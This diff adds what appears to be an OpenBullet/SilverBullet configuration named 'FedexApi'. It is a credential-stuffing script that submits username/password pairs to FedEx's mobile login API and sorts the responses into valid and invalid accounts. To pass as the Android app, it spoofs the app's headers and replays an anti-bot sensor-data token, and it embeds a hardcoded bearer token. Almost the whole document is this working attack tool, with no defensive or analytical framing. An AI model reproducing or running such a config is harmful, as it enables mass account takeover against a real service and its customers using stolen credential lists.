@@ -1,0 +1,86 @@
+[SETTINGS]
+{
+  "Name": "FedexApi",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-07T11:22:54.9669163+01:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.1.1 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "FedexApi",
+  "IconPath": "Icon\\svbfile.ico",
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://api.fedex.com/user/v1/login" 
+  CONTENT "{\"LogInRequest\":{\"userName\":\"<USER>\",\"password\":\"<PASS>\",\"processingParameters\":{\"anonymousTransaction\":true,\"returnDetailedErrors\":false,\"returnLocalizedDateTime\":false}}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "content-type: application/json" 
+  HEADER "X-experienceid: MOBI" 
+  HEADER "x-clientid: ANDR" 
+  HEADER "x-locale: en_US" 
+  HEADER "User-Agent: FedEx-MobileApp/8.9.0(Android 7.1.2;SM-N975F)" 
+  HEADER "Accept: application/json" 
+  HEADER "X-clientversion: 8.9.0" 
+  HEADER "X-acf-sensor-data: 2,a,aqjhxUeYrvNk3HDjd6lo6oL4oWJfzEt6XLA4mnib09ZLsXgvcV2DLaHOkiRBnHVIOF/LYR2Zq8V1P+NOpgaIfEVzP4n/Mizro+x79lcOGbf8yrbsjlVxsU7Iy2Aca60oHC74jtqebftoSwsH195kjXgBfPyBP9lk2jHHva2H06g=,DJPY0n6G5zBi5hPCTTXE8NoPimzsQX9gZd4h9JHFPP/QRLkpc3IcRs7rOQ9eH3yHjdCp9xvJabXxqJrxYJWAlydl09wynl/VRfrMb8ecRzXbhaAzxlY5Z2GV+zLn2pic9qnDIA/J5X4Pr/fSkwP85TrP6Xe1rOJKHQOwRk7tBPI=$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$1000,0,0$$" 
+  HEADER "Authorization: Bearer l7xxab8ba706a6ee43cca20aaf29de2d35f0" 
+  HEADER "Host: api.fedex.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 181" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Login incorrect" 
+  KEYCHAIN Success OR 
+    KEY "LOGIN.INCOMPLETE.USER" 
+    KEY "Your User ID registration is incomplete for shipping" 
+
